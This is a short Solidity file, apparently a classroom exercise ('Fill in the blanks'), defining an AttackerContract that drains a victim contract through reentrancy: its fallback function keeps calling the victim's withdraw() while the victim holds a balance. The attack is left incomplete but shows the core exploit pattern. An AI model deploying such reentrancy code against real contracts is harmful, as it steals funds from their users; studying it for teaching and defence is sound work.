// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.7 <0.9.0;

abstract contract VictimContractInterface { 
    function withdraw() public virtual payable;
}


contract AttackerContract { 
    
    VictimContractInterface public victim;


    constructor(address _victim)  { 

        victim = VictimContractInterface(_victim);

    }
  
    // Trigger the attack
    function attack() public payable { 
        // Fill in the blanks

        victim.withdraw();
    }

    fallback() external payable {
        // attack if still funds to withdrawl
        if (address(victim).balance >= 1) {
            victim.withdraw();

        }
    }

    function getAttackerBalance() public view returns(uint) {
        return address(this).balance; 
    }

    function getVictimBalance() public view returns(uint) { 
        return address(victim).balance;
    } 

  
}
